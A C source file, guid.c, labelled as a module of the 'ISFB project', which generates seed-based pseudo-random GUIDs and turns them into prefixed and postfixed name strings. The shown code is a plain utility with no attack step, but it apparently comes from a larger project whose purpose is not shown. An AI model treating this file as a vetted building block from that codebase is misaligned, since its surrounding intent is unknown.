//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: guid.c
// $Revision: 250 $
// $Date: 2014-06-09 14:26:38 +0400 (Пн, 09 июн 2014) $
// description:
//	Pseudo-random GUIDs.

#include "common.h"

//
//	Generates pseudo random number based on the specified seed value.
//
static ULONG MyRandom(PULONG pSeed)
{
	return(*pSeed = 1664525*(*pSeed)+1013904223);
}


//
//	Generates a GUID based on the specified seed value. The same seeds will create the same GUIDs on the same machine.
//
VOID GenGuid(GUID* pGuid, PULONG pSeed)
{
	ULONG i;
	pGuid->Data1 = MyRandom(pSeed);
	pGuid->Data2 = (USHORT)MyRandom(pSeed);
	pGuid->Data3 = (USHORT)MyRandom(pSeed);
	for (i=0; i<8; i++)
		pGuid->Data4[i] = (UCHAR)MyRandom(pSeed);
}

//
//	Fills the specified pGuidName with generated GUID value based on the specified pSeed.
//
VOID FillGuidName(
	IN OUT	PULONG	pSeed,
	OUT		LPTSTR	pGuidName
	)
{
	GUID	Guid;
	ULONG	bSize;

	GenGuid(&Guid, pSeed);
	bSize = wsprintf(pGuidName, szGuidStrTemp1, Guid.Data1, Guid.Data2, Guid.Data3, *(USHORT*)&Guid.Data4[0], *(ULONG*)&Guid.Data4[2],  *(USHORT*)&Guid.Data4[6]);
	ASSERT(bSize <= GUID_STR_LENGTH);
}



//
//	Writes the specified GUID structure into the specified memory buffer as 0-terminated string.
//
ULONG GuidToBuffer(
	GUID*	pGuid,
	LPTSTR	pBuffer,
	BOOL	bQuoted
	)
{
	LPTSTR	TempStr;

	if (bQuoted)
		TempStr = szGuidStrTemp1;
	else
		TempStr = szGuidStrTemp2;

	return(wsprintf(pBuffer, TempStr, htonL(pGuid->Data1),	htonS(pGuid->Data2), htonS(pGuid->Data3), htonS(*(USHORT*)&pGuid->Data4[0]), 
		htonL(*(ULONG*)&pGuid->Data4[2]), htonS(*(USHORT*)&pGuid->Data4[6])));
}

//
//	Allocates memory buffer and writes the specified GUID structure into it as 0-terminated string.
//	Caller is responsable for freeing the buffer.
//
LPTSTR GuidToString(
	GUID*	pGuid, 
	BOOL	bQuoted
	)
{
	LPTSTR	pGuidStr;

	if (pGuidStr = (LPTSTR)AppAlloc((GUID_STR_LEN+1)*sizeof(_TCHAR)))
		GuidToBuffer(pGuid, pGuidStr, bQuoted);

	return(pGuidStr);
}


//
//	Generates a string containing the Prefix, random GUID based on specified Seed, and the Postfix.
//
LPTSTR GenGuidName(
	IN OUT	PULONG	pSeed,					// pointer to a random seed value
	IN		LPTSTR	Prefix OPTIONAL,		// pointer to a prefix string (optional)
	IN		LPTSTR	Postfix OPTIONAL,		// pointer to a postfix string (optional)
	IN		BOOL	bQuoted
	)
{
	ULONG	NameLen = GUID_STR_LENGTH + 1;
	LPTSTR	GuidStr, Name = NULL;
	GUID	Guid;

	GenGuid(&Guid, pSeed);
	if (GuidStr = GuidToString(&Guid, bQuoted))
	{
		if (Prefix)
			NameLen += lstrlen(Prefix);
		if (Postfix)
			NameLen += lstrlen(Postfix);

		if (Name = (LPTSTR)AppAlloc(NameLen*sizeof(_TCHAR)))
		{
			Name[0] = 0;

			if (Prefix)
				lstrcpy(Name, Prefix);
		
			lstrcat(Name, GuidStr);
			if (Postfix)
				lstrcat(Name, Postfix);
		}
		AppFree(GuidStr);
		
	}	// if (GuidStr = 
	return(Name);
}


